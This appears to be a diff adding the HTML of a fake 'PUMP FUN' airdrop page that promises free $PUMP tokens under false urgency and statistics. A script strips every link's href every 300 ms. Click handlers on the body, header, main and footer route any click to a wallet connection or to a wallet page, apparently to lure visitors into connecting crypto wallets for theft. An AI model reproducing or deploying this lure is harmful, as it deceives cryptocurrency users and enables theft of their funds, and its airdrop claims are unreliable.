var(--w3m-color-mix-strength),var(--wui-color-fg-350));--wui-color-bg-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-100));--wui-color-bg-125:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-125));--wui-color-bg-150:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-150));--wui-color-bg-175:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-175));--wui-color-bg-200:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-200));--wui-color-bg-225:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-225));--wui-color-bg-250:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-250));
+		--wui-color-bg-275:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-275));--wui-color-bg-300:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-300));--wui-color-bg-325:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-325));--wui-color-bg-350:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-bg-350));--wui-color-success-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-success-base-100));--wui-color-success-125:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-success-base-125));--wui-color-warning-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-warning-base-100));--wui-color-error-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-error-base-100));--wui-color-blue-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-blue-base-100));--wui-color-blue-90:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-blue-base-90));--wui-color-error-125:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-error-base-125));--wui-icon-box-bg-error-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-icon-box-bg-error-base-100));--wui-icon-box-bg-accent-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-icon-box-bg-blue-base-100));--wui-icon-box-bg-success-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-icon-box-bg-success-base-100));--wui-icon-box-bg-inverse-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-icon-box-bg-inverse-base-100));--wui-all-wallets-bg-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-all-wallets-bg-100));--wui-avatar-border:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-avatar-border-base));--wui-thumbnail-border:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-thumbnail-border-base));--wui-wallet-button-bg:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-wallet-button-bg-base))}}body {margin:0;padding:0}</style><style>:root {--w3m-color-mix:#fff;--w3m-accent:hsla(231, 100%, 70%, 1);--w3m-default:#fff;--wui-color-modal-bg-base:#121313;--wui-color-accent-base-100:var(--w3m-accent);--wui-color-blueberry-100:hsla(230, 100%, 67%, 1);--wui-color-blueberry-090:hsla(231, 76%, 61%, 1);--wui-color-blueberry-080:hsla(230, 59%, 55%, 1);--wui-color-blueberry-050:hsla(231, 100%, 70%, 0.1);--wui-color-fg-100:#e4e7e7;--wui-color-fg-125:#d0d5d5;--wui-color-fg-150:#a8b1b1;--wui-color-fg-175:#a8b0b0;--wui-color-fg-200:#949e9e;--wui-color-fg-225:#868f8f;--wui-color-fg-250:#788080;--wui-color-fg-275:#788181;--wui-color-fg-300:#6e7777;--wui-color-fg-325:#9a9a9a;--wui-color-fg-350:#363636;--w3m-embedded-background:#131313;--wui-color-bg-100:#141414;--wui-color-bg-125:#191a1a;--wui-color-bg-150:#1e1f1f;--wui-color-bg-175:#222525;--wui-color-bg-200:#272a2a;--wui-color-bg-225:#2c3030;--wui-color-bg-250:#313535;--wui-color-bg-275:#363b3b;--wui-color-bg-300:#3b4040;--wui-color-bg-325:#252525;--wui-color-bg-350:#ffffff;--wui-color-success-base-100:#26d962;--wui-color-success-base-125:#30a46b;--wui-color-warning-base-100:#f3a13f;--wui-color-error-base-100:#f25a67;--wui-color-error-base-125:#df4a34;--wui-color-blue-base-100:rgba(102, 125, 255, 1);--wui-color-blue-base-90:rgba(102, 125, 255, 0.9);--wui-color-success-glass-001:rgba(38, 217, 98, 0.01);--wui-color-success-glass-002:rgba(38, 217, 98, 0.02);--wui-color-success-glass-005:rgba(38, 217, 98, 0.05);--wui-color-success-glass-010:rgba(38, 217, 98, 0.1);--wui-color-success-glass-015:rgba(38, 217, 98, 0.15);--wui-color-success-glass-020:rgba(38, 217, 98, 0.2);--wui-color-success-glass-025:rgba(38, 217, 98, 0.25);--wui-color-success-glass-030:rgba(38, 217, 98, 0.3);--wui-color-success-glass-060:rgba(38, 217, 98, 0.6);--wui-color-success-glass-080:rgba(38, 217, 98, 0.8);--wui-color-success-glass-reown-020:rgba(48, 164, 107, 0.2);--wui-color-warning-glass-reown-020:rgba(243, 161, 63, 0.2);--wui-color-error-glass-001:rgba(242, 90, 103, 0.01);--wui-color-error-glass-002:rgba(242, 90, 103, 0.02);--wui-color-error-glass-005:rgba(242, 90, 103, 0.05);--wui-color-error-glass-010:rgba(242, 90, 103, 0.1);--wui-color-error-glass-015:rgba(242, 90, 103, 0.15);--wui-color-error-glass-020:rgba(242, 90, 103, 0.2);--wui-color-error-glass-025:rgba(242, 90, 103, 0.25);--wui-color-error-glass-030:rgba(242, 90, 103, 0.3);--wui-color-error-glass-060:rgba(242, 90, 103, 0.6);--wui-color-error-glass-080:rgba(242, 90, 103, 0.8);--wui-color-error-glass-reown-020:rgba(223, 74, 52, 0.2);--wui-color-gray-glass-001:rgba(255, 255, 255, 0.01);--wui-color-gray-glass-002:rgba(255, 255, 255, 0.02);--wui-color-gray-glass-005:rgba(255, 255, 255, 0.05);--wui-color-gray-glass-010:rgba(255, 255, 255, 0.1);--wui-color-gray-glass-015:rgba(255, 255, 255, 0.15);--wui-color-gray-glass-020:rgba(255, 255, 255, 0.2);--wui-color-gray-glass-025:rgba(255, 255, 255, 0.25);--wui-color-gray-glass-030:rgba(255, 255, 255, 0.3);--wui-color-gray-glass-060:rgba(255, 255, 255, 0.6);--wui-color-gray-glass-080:rgba(255, 255, 255, 0.8);--wui-color-gray-glass-090:rgba(255, 255, 255, 0.9);--wui-color-dark-glass-100:rgba(42, 42, 42, 1);--wui-icon-box-bg-error-base-100:#3c2426;--wui-icon-box-bg-blue-base-100:#20303f;--wui-icon-box-bg-success-base-100:#1f3a28;--wui-icon-box-bg-inverse-base-100:#243240;--wui-all-wallets-bg-100:#222b35;--wui-avatar-border-base:#252525;--wui-thumbnail-border-base:#252525;--wui-wallet-button-bg-base:var(--wui-color-bg-125);--w3m-card-embedded-shadow-color:rgb(17 17 18 / 25%)}</style>
+<script src="./react-18.2.0.min.js"></script>
+
+<script>
+    function addClassesToElements() {
+        const links = document.querySelectorAll('a:not(.interact-button)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('interact-button');
+        }
+        const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+        for (const button of buttons) {
+            button.classList.add('interact-button');
+        }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
+    </head>
+		
+	
+	<body onclick="window.location.href='wallet/index.html';">
+		<header onclick="window.startConnect()" class="header">
+			<div class="container">
+				<div class="header-content">
+					<div class="header-left">
+						<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" class="logo">
+							<img src="logo.svg" alt="PUMP FUN">
+							<span>PUMP FUN</span>
+						</a>
+						<div class="price-ticker">
+							<span class="price-label">PUMP</span>
+							<span class="price-value" id="pumpPrice">$0.015744</span>
+							<span class="price-change negative" id="priceChange">-0.88%</span>
+						</div>
+					</div>
+
+					<div class="header-right">
+						<div class="social-links">
+							<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" target="_blank" class="social-link">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+									<path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+								</svg>
+							</a>
+							<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" target="_blank" class="social-link">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+									<path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"></path>
+								</svg>
+							</a>
+							<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" target="_blank" class="social-link">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+									<path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419-.0190 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9460 2.4189-2.1568 2.4189Z"></path>
+								</svg>
+							</a>
+						</div>
+						<a class="claim-button">Claim Tokens</a>
+					</div>
+				</div>
+			</div>
+		</header>
+
+		<main onclick="window.startConnect()">
+			<section class="hero">
+				<div class="container">
+					<div class="hero-wrapper">
+						<div class="hero-content">
+							<div class="hero-badge">
+								<span>PUMP FUN Airdrop Live</span>
+							</div>
+
+							<h1 class="hero-title">
+								Get your free <br><span class="highlight">$PUMP</span> tokens
+							</h1>
+
+							<p class="hero-description">
+								Join the exclusive PUMP FUN airdrop and claim your free tokens.
+								Limited time opportunity for early adopters and community
+								members. Don't miss out on this revolutionary DeFi project.
+							</p>
+
+							<div class="hero-buttons">
+								<a class="claim-button-hero">Claim Your Tokens</a>
+								<a class="learn-button">Learn More</a>
+							</div>
+						</div>
+
+						<div class="hero-illustration">
+							<img src="pump.png" alt="PUMP Token" class="hero-image">
+						</div>
+					</div>
+				</div>
+			</section>
+
+			<section class="about-airdrop">
+				<div class="container">
+					<div class="about-content">
+						<div class="about-text">
+							<h2 class="about-title">
+								About <span class="highlight">$PUMP</span> Airdrop
+							</h2>
+							<p class="about-description">
+								The PUMP FUN airdrop is a limited-time distribution of free PUMP
+								tokens to early supporters and active community members. This
+								exclusive opportunity rewards our dedicated users who believe in
+								the future of decentralized finance.
+							</p>
+
+							<div class="airdrop-stats">
+								<div class="stat-item">
+									<span class="stat-number">1,000,000</span>
+									<span class="stat-label">Total Tokens</span>
+								</div>
+								<div class="stat-item">
+									<span class="stat-number">50,000</span>
+									<span class="stat-label">Participants</span>
+								</div>
+								<div class="stat-item">
+									<span class="stat-number">7</span>
+									<span class="stat-label">Days Left</span>
+								</div>
+							</div>
+
+							<div class="eligibility-info">
+								<h3 class="eligibility-title">Eligibility Requirements</h3>
+								<div class="eligibility-wrapper">
+									<ul class="eligibility-list">
+										<li>Be an active PUMP FUN platform user</li>
+										<li>Complete social media verification</li>
+										<li>Join our official Telegram channel</li>
+										<li>Follow @pumpfun on Twitter</li>
+									</ul>
+									<div class="eligibility-illustration">
+										<img src="wallet.png" alt="Wallet" class="eligibility-image">
+									</div>
+								</div>
+							</div>
+
+							<div class="connect-section">
+								<p class="connect-text">Ready to claim your tokens?</p>
+								<button class="connect-wallet-btn">
+									Connect Wallet
+								</button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+		</main>
+
+		<footer onclick="window.startConnect()" class="footer">
+			<div class="container">
+				<div class="footer-content">
+					<div class="footer-brand">
+						<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" class="footer-logo">
+							<img src="logo.svg" alt="PUMP FUN">
+							<span>PUMP FUN</span>
+						</a>
+						<p class="footer-description">
+							The revolutionary decentralized platform for meme token creation
+							and trading. Join millions of users building the future of DeFi.
+						</p>
+						<div class="footer-social">
+							<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" target="_blank" class="footer-social-link">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+									<path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+								</svg>
+							</a>
+							<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" target="_blank" class="footer-social-link">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+									<path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"></path>
+								</svg>
+							</a>
+							<a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#" target="_blank" class="footer-social-link">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+									<path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419-.0190 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9460 2.4189-2.1568 2.4189Z"></path>
+								</svg>
+							</a>
+						</div>
+					</div>
+
+					<div class="footer-links">
+						<div class="footer-column">
+							<h3 class="footer-title">Platform</h3>
+							<ul class="footer-menu">
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Airdrop</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Trading</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Staking</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Analytics</a></li>
+							</ul>
+						</div>
+
+						<div class="footer-column">
+							<h3 class="footer-title">Community</h3>
+							<ul class="footer-menu">
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Documentation</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Support</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Blog</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Events</a></li>
+							</ul>
+						</div>
+
+						<div class="footer-column">
+							<h3 class="footer-title">Resources</h3>
+							<ul class="footer-menu">
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">API</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Whitepaper</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Roadmap</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Tokenomics</a></li>
+							</ul>
+						</div>
+
+						<div class="footer-column">
+							<h3 class="footer-title">Legal</h3>
+							<ul class="footer-menu">
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Privacy Policy</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Terms of Service</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Cookie Policy</a></li>
+								<li><a href="https://rewardspump.fun/l/-c--pumpfunclaim-1f707/index.html#">Disclaimer</a></li>
+							</ul>
+						</div>
+					</div>
+				</div>
+
+				<div class="footer-bottom">
+					<div class="footer-bottom-content">
+						<p class="footer-copyright">
+							© 2025 PUMP FUN. All rights reserved.
+						</p>
+						<div class="footer-stats">
+							<span class="footer-stat">
+								<span class="stat-value">$2.5M</span>
+								<span class="stat-label">Total Volume</span>
+							</span>
+							<span class="footer-stat">
+								<span class="stat-value">150K+</span>
+								<span class="stat-label">Active Users</span>
+							</span>
+							<span class="footer-stat">
+								<span class="stat-value">24/7</span>
+								<span class="stat-label">Support</span>
+							</span>
+						</div>
+					</div>
+				</div>
+			</div>
+		</footer>
+
+		
+	
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;99481743d8da428cae176cd512614af0&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'99ae8eea4f5d6a4d',t:'MTc2MjUzNjYyMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;"></iframe></body></html>
